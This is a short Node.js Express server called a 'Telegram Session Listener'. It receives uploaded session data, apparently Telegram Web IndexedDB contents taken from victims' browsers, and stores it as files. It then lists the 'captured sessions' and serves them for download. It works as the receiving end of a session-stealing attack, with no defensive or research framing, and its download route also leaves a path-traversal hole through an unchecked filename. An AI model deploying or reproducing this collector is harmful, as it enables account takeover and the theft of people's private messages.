const express = require('express');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Increase payload size limit (IndexedDB can be large)
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Ensure data directory exists
const DATA_DIR = path.join(__dirname, 'sessions');
fs.ensureDirSync(DATA_DIR);

// Root endpoint – confirms service is live
app.get('/', (req, res) => {
    res.send(`
        <h1>Telegram Session Listener</h1>
        <p>Service is running.</p>
        <p>POST to <code>/upload</code> with JSON payload to store a session.</p>
        <p>GET <a href="/sessions">/sessions</a> to list captured sessions.</p>
    `);
});

// Upload endpoint – receives session data
app.post('/upload', async (req, res) => {
    try {
        const payload = req.body;
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `session_${timestamp}.json`;
        const filepath = path.join(DATA_DIR, filename);
        
        await fs.writeJson(filepath, payload, { spaces: 2 });
        
        console.log(`Session saved: ${filename} (${JSON.stringify(payload).length} bytes)`);
        res.json({ success: true, filename });
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: 'Failed to save session' });
    }
});

// List all captured sessions
app.get('/sessions', async (req, res) => {
    try {
        const files = await fs.readdir(DATA_DIR);
        const sessions = files.filter(f => f.endsWith('.json'));
        res.json({ sessions });
    } catch (error) {
        res.status(500).json({ error: 'Failed to list sessions' });
    }
});

// Download a specific session file
app.get('/download/:filename', async (req, res) => {
    try {
        const filepath = path.join(DATA_DIR, req.params.filename);
        if (!await fs.pathExists(filepath)) {
            return res.status(404).send('File not found');
        }
        res.download(filepath);
    } catch (error) {
        res.status(500).send('Error downloading file');
    }
});

app.listen(PORT, () => {
    console.log(`Session listener running on port ${PORT}`);
});
